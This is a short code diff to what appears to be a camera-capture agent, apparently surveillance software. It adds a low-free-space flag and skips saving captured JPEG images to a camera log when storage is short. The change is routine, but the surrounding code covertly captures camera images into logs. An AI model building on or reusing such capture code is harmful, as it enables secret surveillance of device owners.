@@ -124,6 +124,30 @@ void CAgentCamera::StopAgentCmdL()
 		}
 	}
 
+void CAgentCamera::NotifyAgentCmdL(TUint32 aData)
+	{
+	TInt notifyType = aData & 0x000000ff;
+	switch(notifyType)
+		{
+		case ENotifyThreshold:
+			{
+			TInt value = (aData & 0x0000ff00) >> 8;
+			if (value == EBelow)
+				{
+				iBelowFreespaceQuota = ETrue;
+				}
+			else
+				{
+				iBelowFreespaceQuota = EFalse;
+				}
+			}
+			break;
+		default:
+			break;
+		}
+	}
+
+
 void CAgentCamera::TimerExpiredL(TAny* src)
 	{
 	++iPerformedStep;
@@ -198,11 +222,14 @@ void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
 		CleanupStack::PushL(jpegImage);
 		if (jpegImage->Length() > 0)
 			{
-			CLogFile* logFile = CLogFile::NewLC(iFs);
-			logFile->CreateLogL(LOGTYPE_CAMERA);
-			logFile->AppendLogL(*jpegImage);
-			logFile->CloseLogL();
-			CleanupStack::PopAndDestroy(logFile);
+			if(!iBelowFreespaceQuota)
+				{
+				CLogFile* logFile = CLogFile::NewLC(iFs);
+				logFile->CreateLogL(LOGTYPE_CAMERA);
+				logFile->AppendLogL(*jpegImage);
+				logFile->CloseLogL();
+				CleanupStack::PopAndDestroy(logFile);
+				}
 			}
 		CleanupStack::PopAndDestroy(jpegImage);
 		}
